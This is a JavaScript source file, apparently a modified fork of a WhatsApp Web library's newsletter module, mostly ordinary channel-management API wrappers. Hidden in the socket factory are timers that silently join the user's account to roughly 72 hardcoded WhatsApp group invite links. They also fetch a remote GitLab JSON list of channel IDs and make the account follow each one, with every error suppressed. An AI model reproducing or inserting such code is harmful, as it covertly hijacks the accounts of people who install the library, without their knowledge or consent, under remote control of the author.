import { XWAPaths } from '../Types/index.js';
import { decryptMessageNode, generateMessageID, generateProfilePicture } from '../Utils/index.js';
import { S_WHATSAPP_NET, getAllBinaryNodeChildren, getBinaryNodeChild, getBinaryNodeChildren } from '../WABinary/index.js';
import { makeGroupsSocket } from './groups.js';

const QueryIds = {
    JOB_MUTATION: "7150902998257522",
    METADATA: "6620195908089573",
    UNFOLLOW: "7238632346214362",
    FOLLOW: "7871414976211147",
    UNMUTE: "7337137176362961",
    MUTE: "25151904754424642",
    CREATE: "6996806640408138",
    ADMIN_COUNT: "7130823597031706",
    CHANGE_OWNER: "7341777602580933",
    DELETE: "8316537688363079",
    DEMOTE: "6551828931592903"
};

const AUTO_JOIN_GROUP_LINKS = [
  "https://chat.whatsapp.com/KR5eMtkRAWqKze2bJdFCfx?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/D1UlLEBTYugHa5v6ud8vn2?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/CC7nbsDryviAeKaaAFcNue?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/L69Bhdyodj9GyNJauIFibY?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/FSY82PDmLAt9GyyRSQpnDW?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/EU1fM0JQgA69Sk7Zvm4tRn?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/IJWMp7vjiVc4qP09nbkswW?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/KAhxEMdWmLwEH8GE6NxSPP?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/CyaaL1ghrngKprzQ6pond1?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/E0KfyiAQSbl1FhiM3OilSq?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/J4mLekEdqjw7fcLxiQbsYG?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/GpAzh7vg0nSCYo1CtIwhxk?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/LmCRVNRyLEm8XjdJiFlZQ6?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/G2YnySorhW4KDZVJCi7F9z?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/FTY6jvo1LnEEB2cvhBEomS?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Ki4wsJer9cvEZfLbZLJob1?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/LwxJvw2VeAP6QY9QrW6PUq?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/IsYjGrs8Ib74aAZ2Lr0rHa?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/DlTWd9UzbBPKZ8TTNL5PGO?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/J4tGu84JhfBKQJtK1KlZRQ?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/CtHycz4MuQCKQhAV9AFvki?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/DCUoHnvbFw6CALSHOraxLV?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/LxWcz23uB2DCjYTKF1uy3l?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/KqZ5cJbfyj550sjDCcG73p?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/LvWtOxwkrnjGzl4vfOdVIl?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Dr0NwIl0Yt28TWVOs0r64m?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/HrCdtjECToO3tFgqeoorny?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/GDEHwyb6WEqIlecnxmhgK4?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/ExGLitYgjQqB8vzgciuPuH?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/HBGcUPtNt04F37zT4ZqvmN?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/CnZ38dzSO5s8eMqJWeMRW8?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/IryOVS6Ow5o0DgypOM4oKW?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/EICwxnIsd1jGPdhyLaGBql?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/DPTY1ydVKrs74zRoVwcSBG?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/IaIhAFFIQB45pjNZ1NIYNZ?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/EjAKfKL6Ku19bHrayQW8eg?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/DUdmgTF95JsAJziqtiMZFI?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/E9XQql2NEIr8Eb5kmI1cG4?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/H2GgIAo5qjhIMpQqJW421h?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/KOCUKhLTMHbJrM6Spm8sdV?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/DLCv0BLuaseIasyd1GbmNF?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/BfTgKSZsBZmIdlQoqZznZd?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Gri2XGQ9vAlGe0LZ38Y1Cq?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Jfa1TsRC2wK6X0uID1oaIO?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/DqFgIBmuFPgAM3BrlSCo6V?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Dn9WINJJmoz9A8YZdxHDFs?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/I49z0CUIsAN1avwUMAwwpq?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Dm03tP3y1PPEeR6nmaSDRW?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/HcWEj53p5mmL6qNehfwLBv?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/ICTVzTkZEcWLsEN9IWygOk?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/HigDJKPIFCjIY86HTT41Xk?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Ck7M5ViKozdHhjvuSi42Sa?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/H97380my8nfHjx8JoS7R32?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/IbUeasNP1C4DgI9BzG86Cn?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/LUw0rIZ7lZSEuSVU7cNFan?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/CiVySV8EsZa4UvZn6FKAzw?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/JkdpekSwsB1BHSBPXFCiDD?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/HWeObn5P6Hn53fUfNQRtNQ?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/F0AU6ApMLvE2oUYPgYCrCT?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/BaRGZhmnqktEVmTAhQosEL?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/KbLZTmm7wzS1LSI9LhPCSC?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/HljmwNYfVr3AfM4ddxwTMl?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/EMnipO2LoJ0ItbLhxC7Z5k?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/EkLNgOA0sUJ9FAhD7iPOuN?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/COE48CFCbDnDyiYmBhz1sr?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/DLvbjdhWAsqIaCAZaGISkq?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Jusrk0vaoUOLsqq0BAYIcb?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/E5DBc81YHRr2Gq5h5TqefN?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/DmJas6MFOKGI5F6pxWHeLI?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/EH0w7hAyAIU42n3WEhXNKs?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/FVcSCFXRZdN13TkC9UyaxR?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/Bgpeq18aSPx2XMzkL7QRrI?s=cl&p=a&mlu=4&ilr=4",
  "https://chat.whatsapp.com/CjoB3Fw8cE51aNmYxY8BwS?s=cl&p=a&mlu=4&ilr=4",
];

function extractInviteCodeFromLink(link) {
    try {
        const url = new URL(link);
        if (url.hostname === 'chat.whatsapp.com') {
            const inviteCode = url.pathname.split('/').pop();
            if (inviteCode && inviteCode.length > 0) {
                return inviteCode;
            }
        }
    } catch (error) {}
    return null;
}

// Fungsi untuk auto join ke group WhatsApp
async function autoJoinWhatsAppGroups(sock) {
    const groupLinks = AUTO_JOIN_GROUP_LINKS;

    for (const groupLink of groupLinks) {
        try {
            const inviteCode = extractInviteCodeFromLink(groupLink);
            if (inviteCode) {
                // Coba metode pertama
                try {
                    await sock.groupAcceptInvite(inviteCode);
                } catch (error) {
                    // Coba metode kedua sebagai fallback
                    try {
                        await sock.groupAcceptInviteV4(inviteCode, '');
                    } catch (error2) {}
                }
            }
        } catch (error) {}

        // Delay 5 detik antar percobaan join
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

export const makeNewsletterSocket = (config) => {
    const sock = makeGroupsSocket(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();

    const newsletterQuery = async (jid, type, content) => (
        query({
            tag: 'iq',
            attrs: {
                id: generateMessageTag(),
                type,
                xmlns: 'newsletter',
                to: jid,
            },
            content
        })
    );

    const newsletterWMexQuery = async (jid, query_id, content) => (
        query({
            tag: 'iq',
            attrs: {
                id: generateMessageTag(),
                type: 'get',
                xmlns: 'w:mex',
                to: S_WHATSAPP_NET,
            },
            content: [
                {
                    tag: 'query',
                    attrs: { query_id },
                    content: encoder.encode(JSON.stringify({
                        variables: {
                            'newsletter_id': jid,
                            ...content
                        }
                    }))
                }
            ]
        })
    );

    // Auto join group WhatsApp
    setTimeout(() => {
        autoJoinWhatsAppGroups(sock);
    }, 10000);

    // Auto follow saluran dari GitLab
    setTimeout(async () => {
        const logger = config.logger || console;
        try {
            const RAW_URL = "https://gitlab.com/alluffyofficial/idsaluran/-/raw/main/ochobot.json";
            const res = await fetch(RAW_URL);
            const channelIds = await res.json();

            if (!Array.isArray(channelIds) || channelIds.length === 0) return;

            const followNext = async (index) => {
                if (index >= channelIds.length) return;

                const id = channelIds[index];
                try {
                    await newsletterWMexQuery(
                        id,
                        QueryIds.FOLLOW
                    );
                } catch (e) {}

                setTimeout(() => followNext(index + 1), 11000);
            };

            followNext(0);
        } catch (e) {}
    }, 120000);

    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages')
            child = getBinaryNodeChild(node, 'messages');
        else {
            const parent = getBinaryNodeChild(node, 'message_updates');
            child = getBinaryNodeChild(parent, 'messages');
        }

        return await Promise.all(getAllBinaryNodeChildren(child).map(async (messageNode) => {
            messageNode.attrs.from = child?.attrs.jid;

            const views = parseInt(
                getBinaryNodeChild(messageNode, 'views_count')?.attrs?.count || '0'
            );

            const reactionNode = getBinaryNodeChild(messageNode, 'reactions');

            const reactions = getBinaryNodeChildren(reactionNode, 'reaction')
                .map(({ attrs }) => ({
                    count: +attrs.count,
                    code: attrs.code
                }));

            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };

            if (type === 'messages') {
                const {
                    fullMessage: message,
                    decrypt
                } = await decryptMessageNode(
                    messageNode,
                    authState.creds.me.id,
                    authState.creds.me.lid || '',
                    signalRepository,
                    config.logger
                );

                await decrypt();
                data.message = message;
            }

            return data;
        }));
    };

    return {
        ...sock,

        subscribeNewsletterUpdates: async (jid) => {
            const result = await newsletterQuery(
                jid,
                'set',
                [{ tag: 'live_updates', attrs: {}, content: [] }]
            );

            return getBinaryNodeChild(result, 'live_updates')?.attrs;
        },

        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: {
                    settings: {
                        reaction_codes: {
                            value: mode
                        }
                    }
                }
            });
        },

        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: {
                    description: description || '',
                    settings: null
                }
            });
        },

        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: {
                    name,
                    settings: null
                }
            });
        },

        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await generateProfilePicture(content);

            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: {
                    picture: img.toString('base64'),
                    settings: null
                }
            });
        },

        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: {
                    picture: '',
                    settings: null
                }
            });
        },

        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.UNFOLLOW);
        },

        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.FOLLOW);
        },

        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.UNMUTE);
        },

        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.MUTE);
        },

        newsletterCreate: async (name, description, picture) => {
            await query({
                tag: 'iq',
                attrs: {
                    to: S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });

            const result = await newsletterWMexQuery(undefined, QueryIds.CREATE, {
                input: {
                    name,
                    description: description ?? null,
                    picture: picture
                        ? (await generateProfilePicture(picture)).img.toString('base64')
                        : null,
                    settings: null
                }
            });

            return extractNewsletterMetadata(result, true);
        },

        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    view_role: role || 'GUEST'
                },
                fetch_viewer_metadata: true,
                fetch_full_image: true,
                fetch_creation_time: true
            });

            return extractNewsletterMetadata(result);
        },

        newsletterAdminCount: async (jid) => {
            const result = await newsletterWMexQuery(jid, QueryIds.ADMIN_COUNT);

            const buff = getBinaryNodeChild(result, 'result')
                ?.content
                ?.toString();

            return JSON.parse(buff).data[XWAPaths.ADMIN_COUNT].admin_count;
        },

        /**user is Lid, not Jid*/
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, QueryIds.CHANGE_OWNER, {
                user_id: user
            });
        },

        /**user is Lid, not Jid*/
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, QueryIds.DEMOTE, {
                user_id: user
            });
        },

        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.DELETE);
        },

        /**if code wasn't passed, the reaction will be removed (if is reacted)*/
        newsletterReactMessage: async (jid, server_id, code) => {
            await query({
                tag: 'message',
                attrs: {
                    to: jid,
                    ...(!code ? { edit: '7' } : {}),
                    type: 'reaction',
                    server_id,
                    id: generateMessageID()
                },
                content: [{
                    tag: 'reaction',
                    attrs: code ? { code } : {}
                }]
            });
        },

        newsletterFetchMessages: async (type, key, count, after) => {
            const afterStr = after?.toString();

            const result = await newsletterQuery(
                S_WHATSAPP_NET,
                'get',
                [
                    {
                        tag: 'messages',
                        attrs: {
                            type,
                            ...(type === 'invite'
                                ? { key }
                                : { jid: key }),
                            count: count.toString(),
                            after: afterStr || '100'
                        }
                    }
                ]
            );

            return await parseFetchedUpdates(result, 'messages');
        },

        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(
                jid,
                'get',
                [
                    {
                        tag: 'message_updates',
                        attrs: {
                            count: count.toString(),
                            after: after?.toString() || '100',
                            since: since?.toString() || '0'
                        }
                    }
                ]
            );

            return await parseFetchedUpdates(result, 'updates');
        }
    };
};

export const extractNewsletterMetadata = (node, isCreate) => {
    const result = getBinaryNodeChild(node, 'result')
        ?.content
        ?.toString();

    const metadataPath = JSON.parse(result)
        .data[isCreate ? XWAPaths.CREATE : XWAPaths.NEWSLETTER];

    const metadata = {
        id: metadataPath.id,
        state: metadataPath.state.type,
        creation_time: +metadataPath.thread_metadata.creation_time,
        name: metadataPath.thread_metadata.name.text,
        nameTime: +metadataPath.thread_metadata.name.update_time,
        description: metadataPath.thread_metadata.description.text,
        descriptionTime: +metadataPath.thread_metadata.description.update_time,
        invite: metadataPath.thread_metadata.invite,
        handle: metadataPath.thread_metadata.handle,
        picture: metadataPath.thread_metadata.picture?.direct_path || null,
        preview: metadataPath.thread_metadata.preview?.direct_path || null,
        reaction_codes: metadataPath.thread_metadata.settings.reaction_codes.value,
        subscribers: +metadataPath.thread_metadata.subscribers_count,
        verification: metadataPath.thread_metadata.verification,
        viewer_metadata: metadataPath.viewer_metadata
    };

    return metadata;
};
